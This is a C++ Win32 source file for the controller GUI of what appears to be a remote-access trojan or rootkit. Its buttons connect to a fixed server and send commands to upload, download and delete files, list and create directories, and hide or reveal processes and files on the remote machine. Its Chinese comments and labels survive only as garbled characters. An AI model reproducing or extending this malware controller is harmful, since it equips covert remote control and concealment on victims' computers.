#include"GUI.h"
#include<Shlobj.h>
#include<string.h>



void GUI::Init(HWND hwnd){

	//��ʼ������
	int button_x = BUTTON_X;
	int button_y = BUTTON_Y;

	//��һ��
	hwndbutton[BUTTON_CLIENT_CONNECT] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"���ӷ�����");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_UPLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_UPLOAD],"�ϴ��ļ�");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_DOWNLOAD] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,		
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_DOWNLOAD],"�����ļ�");

	hwndbutton[BUTTON_SHELL_WINDOW]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE|ES_READONLY,
		SHELL_X,SHELL_Y,SHELL_WIDTH,SHELL_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"����SHELL��ʾ����");

	
	//�ڶ���
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_PROCESS_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"��������");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_FILE_HIDE] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ�����");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_INPUT]=CreateWindow("EDIT",NULL,WS_CHILD|WS_BORDER|WS_VISIBLE|ES_LEFT|ES_MULTILINE,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),NULL); 
	SetWindowText(hwndbutton[BUTTON_SHELL_INPUT],"C:\\HIDEME");


	//������
	button_x += BUTTON_DISTANCE+BUTTON_WIDTH;
	button_y = BUTTON_Y;

	hwndbutton[BUTTON_SHELL_LS] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_LS],"LS");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_MKDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_MKDIR],"MKDIR");

	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RMDIR] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RMDIR],"RMDIR");
	
	button_y += BUTTON_DISTANCE+BUTTON_HEIGHT;

	hwndbutton[BUTTON_SHELL_RM] = CreateWindow("BUTTON","",WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,
		button_x,button_y,BUTTON_WIDTH,BUTTON_HEIGHT,hwnd,0,(HINSTANCE)GetWindowLong(hwnd, GWL_HINSTANCE),0);
	SetWindowText(hwndbutton[BUTTON_SHELL_RM],"RM");

    MoveWindow(hwnd,SCREEN_X,SCREEN_Y,SCREEN_WIDTH,SCREEN_HEIGHT,TRUE);

}


void GUI::ScreenPaint(HWND hwnd){        //�������汳��
	
	PAINTSTRUCT ps;
	HDC hdc= BeginPaint(hwnd, &ps);
	HDC hdcMem = CreateCompatibleDC(hdc);  
	const char* lpszName = "rc2.bmp";
	HBITMAP hBitmap = (HBITMAP)::LoadImage(
		NULL,
		lpszName,
		IMAGE_BITMAP,
		0,
		0,
		LR_LOADFROMFILE);
    BITMAP bm;
    SelectObject(hdcMem,hBitmap);
    GetObject(hBitmap, sizeof(bm), &bm);
    BitBlt(hdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
    DeleteDC(hdcMem);
    EndPaint(hwnd, &ps);

}


void GUI::CommandExecute(HWND hwnd,int dir){
	switch(dir)
	{
	case BUTTON_CLIENT_CONNECT:
		//�жϷ������Ƿ�����
		if(isconnected){
			//�Ͽ�socket������
			if(mc->CloseSocket()){
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"SERVER HAS BEEN SHUT DOWN.");
				SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"���ӷ�����");
				isconnected = false;
			}
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"SERVER SHUT DOWN FAIL.");
			SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"���ӷ�����");
			isconnected = false;
		}
		else{
			//��ʼ��socket
			mc = new MLHT_CLIENT(SERVER_IP,SERVER_PORT);
			//����socket�����
			if(mc->ConnectServer())
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"CONNECT SERVER SUCCESSFUL.");
			else
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"CONNECT SERVER FAIL.");
			SetWindowText(hwndbutton[BUTTON_CLIENT_CONNECT],"�Ͽ�������");
			isconnected =true;
		}
		break;
	case BUTTON_FILE_UPLOAD:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR uploadFilename[MAX_PATH] = {0};									//���ϴ����ļ�
				TCHAR uploadFiledir[MAX_PATH];											//�ϴ������������ļ�·��
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],uploadFiledir,MAX_PATH);	//��������л�ȡ�ϴ�����������Ŀ��·��

				//��ʼ���ļ�ѡ���
				OPENFILENAME ofn= {0};
				ofn.lStructSize = sizeof(ofn);
				ofn.hwndOwner = hwnd;
				//ofn.lpstrFilter = "Exe�ļ�(*.exe)\0*.exe\0�����ļ�(*.*)\0*.*\0";//Ҫѡ����ļ���׺
				ofn.lpstrFilter = 
					"�����ļ�(*.*)";				//Ҫѡ����ļ���׺
				ofn.lpstrInitialDir = "c:\\users";	//Ĭ�ϵ��ļ�·��
				ofn.lpstrFile = uploadFilename;		//����ļ��Ļ�����
				ofn.nMaxFile = sizeof(uploadFilename)/sizeof(*uploadFilename);
				ofn.nFilterIndex = 0;
				ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER ;//��־����Ƕ�ѡҪ����OFN_ALLOWMULTISELECT

				if(GetOpenFileName(&ofn)){
					wsprintf(uploadFiledir,"%s\\%s",uploadFiledir,GetFilename(uploadFilename));//ƴ���ϴ������������ļ�·��
					int ret = mc->UpLoadFile(uploadFilename,uploadFiledir);
					if(ret == OP_SUCCESS)
						wsprintf(str,"�ѳɹ��������ļ�:%s\r\n�ϴ��������:%s",uploadFilename,uploadFiledir);
					else
						wsprintf(str,"�ϴ�ʧ��: %d",ret);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
			}
		}
		break;
	case BUTTON_FILE_DOWNLOAD:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};
			
				TCHAR downloadFiledir[MAX_PATH] = {0};										//���ص����ص��ļ�·��
				TCHAR downloadFilename[MAX_PATH];											//������ļ���
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],downloadFilename,MAX_PATH);	//��������л�ȡ������ļ���

				BROWSEINFO bi;
				ZeroMemory(&bi,sizeof(BROWSEINFO)); 
				bi.hwndOwner = NULL; 
				bi.pszDisplayName = downloadFiledir; 
				bi.lpszTitle = "������ѡ�����ص��ļ����ļ���:"; 
				bi.ulFlags = BIF_RETURNFSANCESTORS;
				LPITEMIDLIST idl = SHBrowseForFolder(&bi);
				if (idl != NULL)
				{ 
					//ѡ�����ص��ļ����ļ���
					if(SHGetPathFromIDList(idl,downloadFiledir))
					{
						wsprintf(downloadFiledir,"%s\\%s",downloadFiledir,GetFilename(downloadFilename));//ƴ�����ص����ص��ļ�·��
						int ret = mc->DownLoadFile(downloadFilename,downloadFiledir);
						if(ret == OP_SUCCESS)
							wsprintf(str,"��������ļ���%s \r\n���������أ�%s",downloadFilename,downloadFiledir);
						else
							wsprintf(str,"����ʧ��: %d",ret);
						SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
					}
				}
			}
		}
		break;
	case BUTTON_PROCESS_HIDE:
		if(!isconnected)
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
		else{
			if(processhide){
				if(mc->ShowProcess() == OP_SUCCESS){
					processhide = false;
					SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"��������");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ���������ʾָ��");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ָ���ʧ��");
			}
			else{
				if(mc->HideProcess() == OP_SUCCESS){
					processhide = true;
					SetWindowText(hwndbutton[BUTTON_PROCESS_HIDE],"������ʾ");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ�����������ָ��");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ָ���ʧ��");
			}
		}
		break;
	case BUTTON_FILE_HIDE:
		if(!isconnected)
			SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
		else{
			if(filehide){
				if(mc->ShowFile() == OP_SUCCESS){
					filehide = false;
					SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ�����");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ����ļ���ʾָ��");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ָ���ʧ��");
			}
			else{
				if(mc->HideFile() == OP_SUCCESS){
					filehide = true;
					SetWindowText(hwndbutton[BUTTON_FILE_HIDE],"�ļ���ʾ");
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�ѷ����ļ�����ָ��");
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ָ���ʧ��");
			}
		}
		break;
	case BUTTON_SHELL_INPUT:
		break;
	case BUTTON_SHELL_LS:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MLHT_SLICE_FILE_LENGTH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//��ȡLSĿ¼

				if(mc->ShellLs(filedir) == OP_SUCCESS){
					wsprintf(str,"%s�ļ�Ŀ¼Ϊ��\r\n%s",filedir,mc->p_get->GetPacketContent());
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"��Ŀ¼ʧ��");
			}
		}
		break;
	case BUTTON_SHELL_MKDIR:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//��ȡMKDIR·��

				if(mc->ShellMkdir(filedir) == OP_SUCCESS){
					wsprintf(str,"�Ѵ����ļ�Ŀ¼��\r\n%s",filedir);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"�����ļ�Ŀ¼ʧ��");
			}
		}
		break;
	case BUTTON_SHELL_RMDIR:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filedir[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filedir,MAX_PATH);	//��ȡRMDIR·��

				if(mc->ShellRmdir(filedir) == OP_SUCCESS){
					wsprintf(str,"��ɾ���ļ�Ŀ¼��\r\n%s",filedir);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ɾ���ļ�Ŀ¼ʧ��");
			}
		}
		break;
	case BUTTON_SHELL_RM:
		{
			if(!isconnected)
				SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"NOT CONNECT SERVER YET.");
			else{
				TCHAR str[MAX_PATH] = {0};

				TCHAR filename[MAX_PATH];
				GetWindowText(hwndbutton[BUTTON_SHELL_INPUT],filename,MAX_PATH); //��ȡRM·��

				if(mc->ShellRm(filename) == OP_SUCCESS){
					wsprintf(str,"��ɾ���ļ���\r\n%s",filename);
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],str);
				}
				else
					SetWindowText(hwndbutton[BUTTON_SHELL_WINDOW],"ɾ���ļ�ʧ��");
			}
		}
		break;
	default:
		break;
	}
}

char* GUI::GetFilename(char* FullPathName)	//��ȡȫ·���е��ļ���
{
	char* pos = FullPathName+strlen(FullPathName);
	while(*pos != '\\'&& pos!=FullPathName)
		pos--;
	if(pos == FullPathName)
		return pos;
	else
		return pos+1;
}